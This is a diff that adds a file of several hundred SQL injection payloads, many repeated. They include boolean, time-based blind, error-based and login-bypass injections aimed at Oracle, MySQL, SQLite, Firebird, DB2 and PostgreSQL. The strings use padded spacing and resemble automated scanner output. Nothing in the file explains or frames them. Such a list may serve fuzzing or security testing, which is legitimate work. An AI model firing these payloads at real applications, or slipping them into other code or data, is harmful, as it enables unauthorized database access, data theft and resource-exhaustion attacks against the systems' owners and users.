@@ -1,0 +1,500 @@
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '
+-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'
+-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  '
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  
+1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1'   )    )    and 2832  =  4165--
+1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1%"   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+-8673"  )   or make_set  (  9354  =  9354,7185  )   and   (  "edap" like "edap
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+-1760   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  1541  =  1541
+" or isNULL  (  1/0  )   /*
+select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1"   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+-9462"  )   as vzga where 4799  =  4799 or 8691  =  1048
+1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '
+-4462%"  )   or 8571  =  8571--
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  "dskh"  =  "dskh
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '
+1" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '
+1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '
+1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum
+1%" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and "%"  =  "
+admin' or '1'  =  '1'/*
+1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'
+1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --
+1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  '
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '
+1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --
+1'   )    )    and 2832  =  4165--
+1%" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and "%"  =  "
+-2583"  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --
+1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1"   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '
+-7731"   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   "unly" like "unly
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '
+1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+-2583"  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '
+1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+or 'unusual'   =   'unusual'
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+1   )    )     )   and 9575  =  1640--
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  "yobb" like "yobb
+select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  "dskh"  =  "dskh
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --
+-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--
+1'   )    )    and 2832  =  4165--
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  '
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1"  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum
+1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg
+1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
+1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  
+1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --
+1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum
+1%" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and "%"  =  "
+1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --
+1"  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --
